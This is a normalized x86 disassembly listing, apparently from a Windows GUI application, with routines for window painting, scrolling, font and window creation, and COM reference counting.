sub eax edx
sar eax 0x4
xor eax eax
jmp r-xdata
push eax
push 0x3
call sub_425df0
add esp 0x8
mov edx [ rw-data ]
imul ecx ecx 0x1c
mov eax [ ecx + edx + 0x18 ]
add ecx edx
cmp eax 0x10
jb r-xdata
cmp ecx eax
jge r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
cmp edx ecx
je r-xdata
mov edx [ rw-data ]
cmp edx ebx
mov [ rw-data ] ecx
je r-xdata
mov ecx [ esp + 0x10 ]
dec edi
mov [ rw-data ] edi
mov ebp [ rw-data ]
add ebp ecx
push 0x0
mov [ rw-data ] ebp
call sub_4290f0
mov esi [ esp + 0x160 ]
add esp 0x4
push 0x0
push 0x0
push esi
call [ InvalidateRect@IAT ]
push esi
call [ UpdateWindow@IAT ]
mov edi [ rw-data ]
push esi
lea eax [ edi + 0x1 ]
push eax
lea ecx [ esp + 0x118 ]
push ecx
call sub_428e60
mov edx [ eax ]
mov ecx [ eax + 0x4 ]
mov [ esp + 0x24 ] edx
mov edx [ eax + 0x8 ]
mov eax [ eax + 0xc ]
add esp 0x10
cmp eax ebx
mov [ esp + 0x18 ] ecx
mov [ esp + 0x1c ] edx
jle r-xdata
dec eax
cmp edi eax
push 0x0
jge r-xdata
dec edi
jns r-xdata
cmp edx ebx
jg r-xdata
test edx edx
jne r-xdata
push 0x0
push esi
lea eax [ esp + 0x104 ]
push ebp
push eax
call sub_428e60
mov ecx [ eax + 0x4 ]
mov edx [ eax ]
mov edi [ eax + 0x8 ]
mov eax [ eax + 0xc ]
add esp 0x10
cmp [ esp + 0x18 ] ecx
jge r-xdata
cmp ebp eax
jge r-xdata
mov edx ecx
sub edx edi
inc edx
lea ebp [ esi + eax ]
cmp ebp edx
jle r-xdata
mov eax esi
neg eax
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
neg eax
jne r-xdata
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
test eax eax
jne r-xdata
mov eax edi
neg eax
jmp r-xdata
mov eax edi
jmp r-xdata
shr eax 0x10
sub eax esi
jmp r-xdata
test edx edx
mov eax [ esp + 0x58 ]
mov [ esp + 0x30 ] ebp
mov [ esp + 0x34 ] eax
mov [ esp + 0x38 ] esi
mov [ esp + 0x3c ] ebx
je r-xdata
mov eax [ esp + 0x48 ]
mov esi [ esp + 0x5c ]
lea ecx [ eax + edx ]
mov edx ecx
mov eax [ edx ]
mov [ esp + 0x6c ] eax
mov eax [ edx + 0x4 ]
mov [ esp + 0x70 ] eax
mov eax [ edx + 0x8 ]
mov ebp [ edx + 0xc ]
mov edx [ ecx ]
mov [ esp + 0x74 ] eax
mov eax [ ecx + 0x8 ]
sub eax edx
add eax 0x2
test esi esi
mov [ esp + 0x90 ] eax
je r-xdata
cmp [ esp + 0x4c ] eax
jge r-xdata
add ecx 0x4
mov ecx [ ecx + 0x4 ]
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
push ebx
push ebx
push 0x113
push ebp
call [ SendMessageA@IAT ]
mov eax [ rw-data ]
mov eax [ esp + 0x10 ]
inc edi
push eax
mov [ rw-data ] edi
call sub_429a30
mov ecx [ rw-data ]
push ecx
call sub_429a30
add esp 0x8
jmp r-xdata
mov ebp [ rw-data ]
sub eax ebx
add ebp eax
push 0x0
mov [ rw-data ] ebp
call sub_4290f0
mov esi [ esp + 0x160 ]
add esp 0x4
push 0x0
push 0x0
push esi
call [ InvalidateRect@IAT ]
push esi
call [ UpdateWindow@IAT ]
mov edi [ rw-data ]
push 0x0
call [ MessageBeep@IAT ]
jmp r-xdata
cmp ebx ebp
jle r-xdata
sub ecx edx
sar ecx 0x4
xor ecx ecx
jmp r-xdata
inc ebp
jmp r-xdata
mov ecx [ esp + 0x68 ]
cmp edx ecx
jg r-xdata
test eax eax
je r-xdata
sub ecx esi
sub ecx edi
inc ecx
mov eax ecx
lea edx [ esi + eax ]
test edx edx
jge r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax 0x1
jmp r-xdata
push 0x0
push 0x0
lea edx [ esp + 0x88 ]
push edx
push 0x1
push 0x0
lea eax [ esp + 0x44 ]
push eax
push edi
call sub_45cef0
mov ecx [ esp + 0xb0 ]
push 0x0
push 0x0
lea edx [ esp + 0xa4 ]
push edx
push 0x1
push 0x0
lea eax [ esp + 0x44 ]
push eax
push edi
mov [ esp + 0x4c ] 0x0
mov [ esp + 0x50 ] ebx
mov [ esp + 0x54 ] esi
mov [ esp + 0x58 ] ecx
call sub_45cef0
mov ecx [ esp + 0xd0 ]
add esp 0x38
push ecx
push edi
call [ SelectObject@IAT ]
mov edx [ esp + 0x68 ]
push edx
call [ DeleteObject@IAT ]
jmp r-xdata
sub ecx edx
sar ecx 0x4
test ecx ecx
jle r-xdata
mov ecx [ esp + 0xb4 ]
add eax esi
cmp ecx eax
mov [ esp + 0x5c ] eax
jg r-xdata
mov edx [ esp + 0x50 ]
lea ecx [ eax + esi ]
cmp ecx edx
jle r-xdata
mov ecx [ rw-data ]
jmp r-xdata
push 0x1
push 0xffffffff
push 0xffffffff
push ecx
push 0x3
call sub_423380
add esp 0x14
test eax eax
je r-xdata
mov ecx [ rw-data ]
cmp ecx eax
je r-xdata
test ecx ecx
jge r-xdata
push 0x0
call [ MessageBeep@IAT ]
jmp r-xdata
cmp ebp ecx
jl r-xdata
mov edx [ rw-data ]
test edx edx
mov ecx [ rw-data ]
jne r-xdata
cmp ecx edi
jle r-xdata
mov esi [ rw-data ]
mov edi [ rw-data ]
push 0x0
push 0x0
push 0x113
push ebx
mov [ rw-data ] 0x1
mov [ rw-data ] 0xffffffff
mov [ rw-data ] 0x0
call [ SendMessageA@IAT ]
mov [ rw-data ] esi
mov [ rw-data ] edi
jmp r-xdata
add esi eax
push 0x1
lea eax [ esp + 0x18 ]
push eax
push 0x1
push ebx
mov [ esp + 0x38 ] esi
mov [ rw-data ] esi
call [ SetScrollInfo@IAT ]
push 0x0
push 0x0
push ebx
call [ InvalidateRect@IAT ]
mov ecx [ esp + 0x15c ]
lea eax [ esp + 0xac ]
push eax
push ecx
call [ EndPaint@IAT ]
mov ecx rw-data
call sub_401420
jmp r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov edx [ esp + 0x4c ]
mov ecx [ esp + 0x48 ]
mov eax [ esp + 0x10 ]
mov ebp [ esp + 0x5c ]
mov esi [ esp + 0x50 ]
inc edx
add ecx 0x10
mov [ esp + 0x4c ] edx
mov [ esp + 0x48 ] ecx
add eax 0x1c
jmp r-xdata
cmp [ esp + 0xbc ] esi
jl r-xdata
mov ecx [ rw-data ]
test ecx ecx
mov eax [ esp + 0x58 ]
mov [ esp + 0x30 ] esi
mov [ esp + 0x34 ] eax
mov [ esp + 0x38 ] edx
mov [ esp + 0x3c ] ebx
je r-xdata
push ecx
call sub_429a30
mov edx [ rw-data ]
push edx
call sub_429a30
add esp 0x8
jmp r-xdata
push ecx
push eax
push 0x3
mov [ rw-data ] eax
call sub_4217f0
add esp 0xc
lea edx [ esp + 0x30 ]
push edx
push ebp
call [ GetClientRect@IAT ]
mov edx [ esp + 0x30 ]
mov eax [ esp + 0x38 ]
mov ecx [ rw-data ]
push ebx
sub eax edx
push eax
push ecx
lea edx [ esp + 0x128 ]
push edx
call sub_428e60
mov edx [ eax + 0x4 ]
mov ecx [ eax ]
mov [ esp + 0x28 ] edx
mov edx [ eax + 0x8 ]
mov eax [ eax + 0xc ]
add esp 0x10
cmp ecx esi
mov [ esp + 0x20 ] eax
jg r-xdata
mov ecx [ esp + 0x10 ]
push ecx
mov [ rw-data ] edi
call sub_429a30
mov edx [ rw-data ]
push edx
call sub_429a30
add esp 0x8
test edi edi
jge r-xdata
mov eax [ rw-data ]
add eax ecx
push 0x0
mov [ rw-data ] eax
call sub_4290f0
mov esi [ esp + 0x160 ]
add esp 0x4
push 0x0
push 0x0
push esi
call [ InvalidateRect@IAT ]
push esi
call [ UpdateWindow@IAT ]
cmp eax ebx
jle r-xdata
push 0x3
push eax
push ebp
push edi
sub ebx eax
push ebx
mov ebx [ rw-data ]
push eax
push ebp
push edi
call sub_4287d0
mov eax [ esp + 0x50 ]
mov ecx [ rw-data ]
mov esi [ esp + 0x70 ]
mov ebx [ esp + 0x80 ]
add esp 0x20
add eax ecx
mov [ esp + 0x30 ] eax
cmp [ ecx + 0x380 ] 0x3
jne r-xdata
mov edx [ rw-data ]
test edx edx
mov ecx [ rw-data ]
mov [ esp + 0x10 ] eax
jne r-xdata
cmp [ esp + 0xb8 ] ebx
jg r-xdata
push 0x3
push eax
push esi
push edi
sub ebx eax
push ebx
mov ebx [ rw-data ]
push eax
push esi
push edi
call sub_4287d0
mov eax [ esp + 0x50 ]
mov edx [ rw-data ]
mov ebx [ esp + 0x80 ]
add esp 0x20
add eax edx
mov [ esp + 0x30 ] eax
cmp [ ecx + 0x380 ] 0x3
jne r-xdata
mov eax ecx
sub eax esi
jns r-xdata
lea eax [ edx - 0x1 ]
cmp esi eax
jle r-xdata
mov ecx [ esp + 0x10 ]
push ecx
mov [ rw-data ] ebp
call sub_429a30
mov edx [ rw-data ]
push edx
call sub_429a30
mov ecx [ rw-data ]
mov edx [ rw-data ]
add esp 0x8
mov ecx [ rw-data ]
sub eax ebx
add ecx eax
push 0x0
mov [ rw-data ] ecx
call sub_4290f0
mov esi [ esp + 0x160 ]
add esp 0x4
push 0x0
push 0x0
push esi
call [ InvalidateRect@IAT ]
push esi
call [ UpdateWindow@IAT ]
cmp [ ecx + 0x34 ] 0x10
jb r-xdata
mov eax [ esp + 0x58 ]
cmp [ esp + 0xc0 ] eax
jl r-xdata
cmp [ ecx + 0x34 ] 0x10
jb r-xdata
mov [ esp + 0x40 ] ecx
dec edx
mov [ esp + 0x40 ] edx
jmp r-xdata
add ecx 0x20
mov ecx [ ecx + 0x20 ]
jmp r-xdata
push 0x0
lea ecx [ ebx - 0x2 ]
push ecx
push esi
push edi
call [ MoveToEx@IAT ]
mov edx [ esp + 0x58 ]
push edx
push esi
push edi
call [ LineTo@IAT ]
mov ecx [ esp + 0x58 ]
mov eax [ esp + 0x5c ]
push ecx
dec eax
push eax
push edi
call [ LineTo@IAT ]
mov eax [ esp + 0x5c ]
lea edx [ ebx - 0x1 ]
push edx
dec eax
push eax
push edi
call [ LineTo@IAT ]
mov eax [ esp + 0x4c ]
cmp [ rw-data ] eax
jne r-xdata
add ecx 0x20
mov ecx [ ecx + 0x20 ]
jmp r-xdata
lea ecx [ esp + 0x40 ]
push ecx
push ebp
mov [ esp + 0x4c ] edi
call [ ClientToScreen@IAT ]
mov edx [ esp + 0x44 ]
mov eax [ esp + 0x40 ]
push edx
push eax
call [ SetCursorPos@IAT ]
jmp r-xdata
mov ebx [ esp + 0x3c ]
mov eax [ esp + 0x34 ]
mov ebp [ esp + 0x30 ]
mov eax [ rw-data ]
add eax 0xffffffe4
push ecx
push eax
call sub_401380
add esp 0x8
test al al
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ esp + 0x70 ]
mov eax [ esp + 0x6c ]
mov edx [ rw-data ]
mov ebx [ esp + 0x74 ]
push 0x1
push ecx
push eax
push edx
sub ebx eax
mov eax [ esp + 0x68 ]
sub ebp ecx
push ebp
inc eax
push eax
inc esi
push esi
push edi
call sub_4287d0
mov ebx [ esp + 0x80 ]
add esp 0x20
jmp r-xdata
push 0x0
push 0x0
lea eax [ esp + 0x88 ]
push eax
push 0x1
push 0x0
lea ecx [ esp + 0x44 ]
push ecx
push edi
call sub_45cef0
mov edx [ esp + 0x98 ]
mov eax [ rw-data ]
lea esi [ ebx + edx ]
mov edx [ esp + 0x6c ]
lea ecx [ esi + eax - 0x1 ]
push 0x0
push 0x0
mov [ esp + 0x3c ] ecx
lea ecx [ esp + 0xa4 ]
push ecx
push 0x1
mov [ esp + 0x48 ] edx
lea eax [ ebx + eax * 2 ]
mov ebx [ esp + 0xa8 ]
push 0x0
lea edx [ esp + 0x44 ]
push edx
add eax ebx
push edi
mov [ esp + 0x4c ] 0x0
mov [ esp + 0x58 ] eax
call sub_45cef0
mov eax [ rw-data ]
mov ecx [ esp + 0x90 ]
add ebx eax
add ecx ebx
lea ebx [ esi + eax ]
mov esi [ rw-data ]
mov eax [ esp + 0xc8 ]
add esp 0x38
mov [ esp + 0x58 ] ecx
mov [ esp + 0x60 ] ebx
neg esi
mov ebx [ esp + 0x3c ]
mov eax [ esp + 0x34 ]
mov esi [ esp + 0x30 ]
mov eax [ rw-data ]
push ecx
mov ecx [ esp + 0x14 ]
add ecx eax
push ecx
call sub_401380
add esp 0x8
test al al
jne r-xdata
mov eax [ esp + 0x70 ]
mov ecx [ esp + 0x6c ]
mov edx [ rw-data ]
push 0xcc0020
push eax
push ecx
sub ebp eax
mov eax [ esp + 0x80 ]
push edx
push ebp
sub eax ecx
push eax
mov eax [ esp + 0x70 ]
inc eax
push eax
inc esi
push esi
push edi
call [ BitBlt@IAT ]
cmp [ eax + 0x380 ] 0x3
jne r-xdata
cmp [ eax + 0x34 ] 0x10
jb r-xdata
add eax 0x20
mov eax [ eax + 0x20 ]
jmp r-xdata
mov eax [ esp + 0x4c ]
mov ecx [ esp + 0x70 ]
mov edx [ rw-data ]
mov ebx [ esp + 0x74 ]
push 0x0
push ecx
mov [ rw-data ] eax
mov eax [ esp + 0x74 ]
push eax
push edx
sub ebx eax
mov eax [ esp + 0x68 ]
sub ebp ecx
push ebp
inc eax
push eax
inc esi
push esi
push edi
call sub_4287d0
mov ebx [ esp + 0x80 ]
add esp 0x20
jmp r-xdata
mov ecx [ rw-data ]
mov edx [ esp + 0x10 ]
add ecx edx
push eax
push ecx
call sub_401380
add esp 0x8
test al al
je r-xdata
sub_42b460
mov eax [ rw-data ]
sub esp 0x30
push ebx
push esi
push edi
xor edi edi
cmp eax 0x1
jne r-xdata
mov ebx [ esp + 0x40 ]
push 0xfffffffa
push ebx
call [ GetWindowLongA@IAT ]
push 0x7f00
mov esi eax
push edi
mov [ esp + 0x28 ] esi
mov [ esp + 0x3c ] r--data
mov [ esp + 0x18 ] 0x8
mov [ esp + 0x14 ] 0x30
mov [ esp + 0x2c ] edi
mov [ esp + 0x40 ] edi
call [ LoadCursorA@IAT ]
mov [ esp + 0x28 ] eax
lea eax [ esp + 0xc ]
push eax
mov [ esp + 0x34 ] edi
mov [ esp + 0x1c ] edi
mov [ esp + 0x20 ] edi
mov [ esp + 0x30 ] edi
mov [ esp + 0x18 ] sub_42a0d0
call [ RegisterClassExA@IAT ]
test ax ax
jne r-xdata
push edi
push edi
push edi
push edi
push rw-data
call sub_439280
add esp 0x4
push eax
push rw-data
call sub_458050
add esp 0x4
push eax
push edi
mov ecx rw-data
call sub_4411b0
push edi
push esi
push edi
push ebx
push edi
push edi
push edi
push edi
push 0x52800000
push edi
push r--data
push edi
call [ CreateWindowExA@IAT ]
pop edi
pop esi
pop ebx
add esp 0x30
retn
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x30
retn
sub_42b540
mov eax [ rw-data ]
sub esp 0x14
push ebx
push ebp
xor ebx ebx
cmp eax ebx
push esi
push edi
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
mov esi [ esp + 0x28 ]
cmp esi ebx
je r-xdata
cmp [ esi + 0x380 ] 0x3
jne r-xdata
cmp [ rw-data ] ebx
jne r-xdata
cmp [ rw-data ] ebx
je r-xdata
cmp [ rw-data ] ebx
jne r-xdata
mov ecx [ rw-data ]
cmp ecx ebx
jne r-xdata
push 0x1
call sub_489430
add esp 0x4
mov eax [ rw-data ]
sub eax ecx
sar eax 0x4
mov [ esp + 0x10 ] eax
mov [ esp + 0x10 ] ebx
jmp r-xdata
jmp r-xdata
mov eax [ esp + 0x10 ]
xor ebp ebp
cmp eax ebx
jle r-xdata
cmp [ esi + 0x34 ] 0x10
jb r-xdata
add esi 0x20
mov esi [ esi + 0x20 ]
jmp r-xdata
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
mov edx [ ecx + 0x14 ]
sub eax edi
push eax
push esi
push edx
push 0x0
call sub_401150
test eax eax
je r-xdata
mov eax [ rw-data ]
lea ecx [ ebx + eax ]
mov eax esi
lea edi [ eax + 0x1 ]
mov ebx [ esp + 0x10 ]
cmp ebp ebx
jge r-xdata
mov eax [ esp + 0x10 ]
inc ebp
add ebx 0x1c
cmp ebp eax
jl r-xdata
dec ebx
cmp ebp ebx
jge r-xdata
mov esi [ esp + 0x28 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x14
retn
mov esi [ esp + 0x10 ]
dec esi
push esi
mov ecx rw-data
call sub_421f10
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x18 ]
sub esp 0x10
mov eax esp
mov [ eax ] ecx
mov ecx [ esp + 0x2c ]
mov [ eax + 0x4 ] edx
mov edx [ esp + 0x30 ]
mov [ eax + 0x8 ] ecx
push esi
mov ecx rw-data
mov [ eax + 0xc ] edx
call sub_429960
mov edi ebp
mov esi ebp
shl edi 0x4
imul esi esi 0x1c
sub ebx ebp
lea ecx [ ecx ]
mov eax [ rw-data ]
push 0xffffffff
lea ecx [ esi + eax ]
push 0x0
lea edx [ ecx + 0x1c ]
push edx
call sub_401dd0
mov eax [ rw-data ]
mov ecx [ eax + edi + 0x10 ]
add eax edi
mov [ eax ] ecx
mov edx [ eax + 0x14 ]
mov [ eax + 0x4 ] edx
mov ecx [ eax + 0x18 ]
mov [ eax + 0x8 ] ecx
mov edx [ eax + 0x1c ]
add esi 0x1c
add edi 0x10
dec ebx
mov [ eax + 0xc ] edx
jne r-xdata
sub_42b6d0
mov edx [ esp + 0x4 ]
push esi
mov eax ecx
push edi
mov edi eax
mov ecx 0x5
mov esi edx
[ edi ] [ esi ]
mov ecx [ esp + 0x14 ]
pop edi
add eax 0x14
test ecx ecx
mov ecx [ esp + 0xc ]
pop esi
je r-xdata
push ecx
push edx
push eax
call sub_447c10
add esp 0xc
retn 0xc
mov edx [ ecx ]
mov [ eax ] edx
mov edx [ ecx + 0x4 ]
mov [ eax + 0x4 ] edx
mov ecx [ ecx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov eax 0x1
retn 0xc
sub_42b770
mov eax [ esp + 0x8 ]
push esi
push edi
mov ecx 0x4
mov edi r--data
mov esi eax
xor edx edx
[ esi ] [ edi ]
je r-xdata
mov eax [ esp + 0xc ]
mov edx [ esp + 0x14 ]
mov [ edx ] eax
mov ecx [ eax ]
push eax
xor esi esi
call [ ecx + 0x4 ]
pop edi
mov eax esi
pop esi
retn 0xc
mov esi eax
mov ecx 0x4
mov edi r--data
xor eax eax
[ esi ] [ edi ]
je r-xdata
mov ecx [ esp + 0x14 ]
pop edi
mov eax 0x80004002
mov [ ecx ] edx
pop esi
retn 0xc
sub_42b7d0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4bfdfb
push eax
mov [ fs : 0x0 ] esp
push ebx
mov ebx ecx
mov eax [ ebx ]
test eax eax
push esi
push edi
je r-xdata
mov edi [ esp + 0x1c ]
mov edx edi
shl edx 0x5
add edx 0x4
push edx
mov [ ebx ] 0x0
call j_sub_4b573e#2
add esp 0x4
mov [ esp + 0x1c ] eax
test eax eax
mov [ esp + 0x14 ] 0x0
je r-xdata
mov ecx [ eax - 0x4 ]
lea esi [ eax - 0x4 ]
push sub_42b6c0
push ecx
push 0x20
push eax
call sub_4b6814
push esi
call j_sub_4b66ed
add esp 0x4
xor esi esi
push sub_42b6c0
push sub_42b6b0
push edi
lea esi [ eax + 0x4 ]
push 0x20
push esi
mov [ eax ] edi
call sub_4b6874
jmp r-xdata
mov ecx [ esp + 0xc ]
mov [ ebx + 0x4 ] edi
pop edi
pop esi
mov eax 0x1
mov [ fs : 0x0 ] ecx
pop ebx
add esp 0xc
retn 0x4
xor eax eax
mov ecx [ esp + 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
add esp 0xc
retn 0x4
test esi esi
mov [ ebx ] esi
jne r-xdata
sub_42b8b0
push esi
mov esi ecx
mov [ esi ] r--data
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov [ esi + 0x8 ] 0x0
pop esi
retn
mov ecx [ eax - 0x4 ]
push edi
lea edi [ eax - 0x4 ]
push sub_42b6c0
push ecx
push 0x20
push eax
call sub_4b6814
push edi
call j_sub_4b66ed
add esp 0x4
pop edi
sub_42b900
push esi
push edi
mov edi [ esp + 0xc ]
lea esi [ edi + 0x4 ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ esi ]
pop edi
pop esi
retn 0x4
test edi edi
je r-xdata
mov ecx edi
call sub_42b8b0
push edi
call j_sub_4b66ed#2
add esp 0x4
sub_42b930
push ebx
mov ebx [ esp + 0xc ]
test ebx ebx
push ebp
push esi
push edi
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x80070057
pop ebx
retn 0xc
mov eax [ esp + 0x1c ]
test eax eax
je r-xdata
test [ ebx + 0x8 ] 0x1
jne r-xdata
mov ecx [ esp + 0x14 ]
mov edx [ ecx + 0x10 ]
xor eax eax
test edx edx
jle r-xdata
pop edi
pop esi
pop ebp
mov eax 0x8004006b
pop ebx
retn 0xc
pop edi
pop esi
pop ebp
mov eax 0x80040064
pop ebx
retn 0xc
mov esi [ ecx + 0x8 ]
mov di [ ebx ]
mov ecx esi
nop
inc eax
add ecx 0x20
cmp eax edx
jl r-xdata
mov ebp [ ecx + 0x10 ]
test [ ebx + 0x10 ] ebp
jne r-xdata
cmp [ ecx ] di
jne r-xdata
mov edx [ esp + 0x1c ]
shl eax 0x5
add eax esi
lea ecx [ eax + 0x14 ]
push ecx
push eax
push edx
call sub_447c10
add esp 0xc
neg eax
pop edi
sbb eax eax
pop esi
and eax 0x7ff8fff2
pop ebp
add eax 0x8007000e
pop ebx
retn 0xc
sub_42b9d0
push esi
mov esi [ esp + 0xc ]
test esi esi
jne r-xdata
test [ esi + 0x8 ] 0x1
jne r-xdata
mov eax 0x80070057
pop esi
retn 0x8
mov eax [ esp + 0x8 ]
mov edx [ eax + 0x10 ]
push ebx
xor ecx ecx
test edx edx
push edi
jle r-xdata
mov eax 0x8004006b
pop esi
retn 0x8
pop edi
pop ebx
mov eax 0x80040064
pop esi
retn 0x8
mov di [ esi ]
mov eax [ eax + 0x8 ]
inc ecx
add eax 0x20
cmp ecx edx
jl r-xdata
mov ebx [ eax + 0x10 ]
test [ esi + 0x10 ] ebx
jne r-xdata
cmp [ eax ] di
jne r-xdata
pop edi
pop ebx
xor eax eax
pop esi
retn 0x8
sub_42ba30
push ebx
push ebp
mov ebp [ esp + 0x14 ]
xor ebx ebx
cmp ebp ebx
jne r-xdata
mov eax [ esp + 0x10 ]
dec eax
mov [ ebp ] ebx
je r-xdata
pop ebp
mov eax 0x80070057
pop ebx
retn 0xc
push esi
push edi
push 0x18
call sub_4b573e
mov esi eax
add esp 0x4
cmp esi ebx
je r-xdata
pop ebp
mov eax 0x80004001
pop ebx
retn 0xc
pop edi
pop esi
pop ebp
mov eax 0x8007000e
pop ebx
retn 0xc
mov edi [ esp + 0x14 ]
mov [ esi ] r--data
mov [ esi + 0x4 ] 0x1
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
mov eax [ edi + 0xc ]
push eax
mov ecx esi
call sub_42db00
test eax eax
jne r-xdata
cmp [ edi + 0x10 ] ebx
jle r-xdata
mov [ esi ] r--data
mov eax [ esi + 0x8 ]
push eax
call j_sub_4b66ed
push esi
mov [ esi + 0x8 ] ebx
call j_sub_4b66ed#2
add esp 0x8
pop edi
mov [ ebp ] esi
pop esi
pop ebp
xor eax eax
pop ebx
retn 0xc
xor ebp ebp
mov eax [ edi + 0x8 ]
add eax ebp
push eax
mov ecx esi
call sub_42dc10
mov eax [ edi + 0x10 ]
inc ebx
add ebp 0x20
cmp ebx eax
jl r-xdata
mov ebp [ esp + 0x1c ]
sub_42baf0
mov edx [ esp + 0x8 ]
test edx edx
push esi
push edi
je r-xdata
pop edi
mov eax 0x80070057
pop esi
retn 0x10
mov ecx [ esp + 0x14 ]
test ecx ecx
je r-xdata
mov esi [ esp + 0xc ]
mov eax [ esi + 0x10 ]
cmp eax [ esi + 0xc ]
jge r-xdata
pop edi
mov eax 0x8007000e
pop esi
retn 0x10
mov edi [ esi + 0x8 ]
shl eax 0x5
add eax edi
mov edi [ esp + 0x18 ]
push edi
push ecx
push edx
mov ecx eax
call sub_42b6d0
test eax eax
jne r-xdata
inc [ esi + 0x10 ]
pop edi
xor eax eax
pop esi
retn 0x10
sub_42bb50
mov eax [ esp + 0x8 ]
push esi
push edi
mov ecx 0x4
mov edi r--data
mov esi eax
xor edx edx
[ esi ] [ edi ]
je r-xdata
mov eax [ esp + 0xc ]
mov edx [ esp + 0x14 ]
mov [ edx ] eax
mov ecx [ eax ]
push eax
xor esi esi
call [ ecx + 0x4 ]
pop edi
mov eax esi
pop esi
retn 0xc
mov esi eax
mov ecx 0x4
mov edi r--data
xor eax eax
[ esi ] [ edi ]
je r-xdata
mov ecx [ esp + 0x14 ]
pop edi
mov eax 0x80004002
mov [ ecx ] edx
pop esi
retn 0xc
sub_42bbe0
push esi
push edi
mov edi [ esp + 0xc ]
lea esi [ edi + 0x8 ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ esi ]
pop edi
pop esi
retn 0x4
test edi edi
je r-xdata
push edi
mov [ edi ] r--data
call j_sub_4b66ed#2
add esp 0x4
sub_42bc10
mov eax [ esp + 0x8 ]
test eax eax
jne r-xdata
mov eax 0x40101
retn 0xc
mov eax [ esp + 0xc ]
and eax 0x3
cmp eax 0x3
je r-xdata
test eax eax
jne r-xdata
xor eax eax
retn 0xc
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax 0x40100
retn 0xc
sub esp 0x70
mov ecx esp
mov [ esp + 0x78 ] esp
push eax
call sub_402400
call sub_407970
add esp 0x70
sub_42bc60
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
mov edx [ eax ]
mov [ eax + 0xc ] ecx
mov ecx [ esp + 0x18 ]
push ecx
mov ecx [ esp + 0x18 ]
push ecx
mov ecx [ esp + 0x18 ]
push ecx
mov ecx [ esp + 0x18 ]
push ecx
push eax
call [ edx + 0x10 ]
retn 0x18
sub_42bca0
sub esp 0x14
mov ax [ esp + 0x18 ]
mov [ esp ] ax
mov eax 0x1
mov [ esp + 0x8 ] eax
mov [ esp + 0x10 ] eax
mov eax [ ecx + 0xc ]
lea edx [ esp ]
push edx
mov [ esp + 0x8 ] 0x0
mov [ esp + 0x10 ] 0xffffffff
mov ecx [ eax ]
push eax
call [ ecx + 0x14 ]
xor ecx ecx
test eax eax
setge cl
mov eax ecx
add esp 0x14
retn 0x4
sub_42bcf0
mov eax [ esp + 0x8 ]
push esi
push edi
mov ecx 0x4
mov edi r--data
mov esi eax
xor edx edx
[ esi ] [ edi ]
je r-xdata
mov eax [ esp + 0xc ]
mov edx [ esp + 0x14 ]
mov [ edx ] eax
mov ecx [ eax ]
push eax
xor esi esi
call [ ecx + 0x4 ]
pop edi
mov eax esi
pop esi
retn 0xc
mov esi eax
mov ecx 0x4
mov edi r--data
xor eax eax
[ esi ] [ edi ]
je r-xdata
mov ecx [ esp + 0x14 ]
pop edi
mov eax 0x80004002
mov [ ecx ] edx
pop esi
retn 0xc
sub_42bd50
push esi
mov esi [ esp + 0x8 ]
push edi
lea edi [ esi + 0x8 ]
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ edi ]
pop edi
pop esi
retn 0x4
test esi esi
je r-xdata
pop edi
xor eax eax
pop esi
retn 0x4
push esi
mov [ esi ] r--data
call j_sub_4b66ed#2
add esp 0x4
sub_42bd90
mov ecx [ esp + 0x4 ]
push 0xf
call sub_42bca0
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
mov [ eax ] 0x4
xor eax eax
retn 0x14
test [ esp + 0x8 ] 0x4
mov eax [ esp + 0x14 ]
je r-xdata
mov [ eax ] 0x1
xor eax eax
retn 0x14
test [ eax ] 0x2
je r-xdata
mov [ eax ] 0x2
xor eax eax
retn 0x14
sub_42bde0
mov ecx [ esp + 0x8 ]
mov eax ecx
dec eax
je r-xdata
mov edx [ esp + 0x10 ]
mov eax [ edx + 0x4 ]
push esi
mov esi [ esp + 0x8 ]
push 0x0
push eax
push 0x64
push esi
push 0x0
push 0x0
push 0x0
push 0x0
push 0x50200004
push r--data
push r--data
push 0x0
call [ CreateWindowExA@IAT ]
push 0x0
push 0x1
push 0x0
push 0x0
push 0x0
push 0x80
push 0x0
push 0x0
push 0x0
push 0x190
push 0x0
push 0x0
push 0x0
push 0xc
call [ CreateFontA@IAT ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov eax 0x1
pop esi
retn 0x10
push 0x0
push eax
push 0x30
push 0x64
push esi
call [ SendDlgItemMessageA@IAT ]
mov ecx [ esp + 0x4 ]
push 0x0
push 0x0
push 0x31
push 0x64
push ecx
call [ SendDlgItemMessageA@IAT ]
test eax eax
je r-xdata
sub eax 0x3
je r-xdata
xor eax eax
retn 0x10
push eax
call [ DeleteObject@IAT ]
mov eax [ esp + 0x10 ]
push 0x6
mov ecx eax
movzx edx ax
mov eax [ esp + 0x8 ]
shr ecx 0x10
push ecx
push edx
push 0x0
push 0x0
push 0x0
push 0x64
push eax
call [ GetDlgItem@IAT ]
push eax
call [ SetWindowPos@IAT ]
xor eax eax
retn 0x10
mov [ esp + 0x8 ] ecx
jmp [ DefWindowProcA@IAT ]
sub_42bed0
sub esp 0x48
push ebx
push esi
push edi
